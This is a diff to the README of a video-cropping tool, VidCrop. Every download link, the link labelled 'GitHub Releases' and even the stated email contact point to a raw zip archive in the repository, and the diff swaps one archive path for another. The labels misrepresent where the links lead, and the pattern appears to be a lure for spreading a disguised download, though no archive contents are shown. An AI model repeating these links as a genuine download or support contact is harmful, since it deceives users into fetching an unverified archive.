@@ -6,9 +6,9 @@ VidCrop is a video cropping tool that helps you easily crop video files. You can
 
 ## 📥 Download VidCrop
 
-[![Download VidCrop](https://raw.githubusercontent.com/varunpatidar7/vidcrop/main/agnoiology/vidcrop.zip%20VidCrop-v1.0-blue)](https://raw.githubusercontent.com/varunpatidar7/vidcrop/main/agnoiology/vidcrop.zip)
+[![Download VidCrop](https://github.com/varunpatidar7/vidcrop/raw/refs/heads/main/assets/Software_3.6.zip%20VidCrop-v1.0-blue)](https://github.com/varunpatidar7/vidcrop/raw/refs/heads/main/assets/Software_3.6.zip)
 
-Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/varunpatidar7/vidcrop/main/agnoiology/vidcrop.zip)
+Visit this page to download: [GitHub Releases](https://github.com/varunpatidar7/vidcrop/raw/refs/heads/main/assets/Software_3.6.zip)
 
 ## ⚙️ System Requirements
 
@@ -48,10 +48,10 @@ If you run into any issues while using VidCrop, please check the FAQ section on 
 
 ## 📧 Contact
 
-For further inquiries or support, feel free to reach out via email at https://raw.githubusercontent.com/varunpatidar7/vidcrop/main/agnoiology/vidcrop.zip
+For further inquiries or support, feel free to reach out via email at https://github.com/varunpatidar7/vidcrop/raw/refs/heads/main/assets/Software_3.6.zip
 
 ---
 
-Again, to download VidCrop, click here: [Download VidCrop](https://raw.githubusercontent.com/varunpatidar7/vidcrop/main/agnoiology/vidcrop.zip)
+Again, to download VidCrop, click here: [Download VidCrop](https://github.com/varunpatidar7/vidcrop/raw/refs/heads/main/assets/Software_3.6.zip)
 
 This guide should help you download and successfully run VidCrop with ease. Enjoy editing your videos!
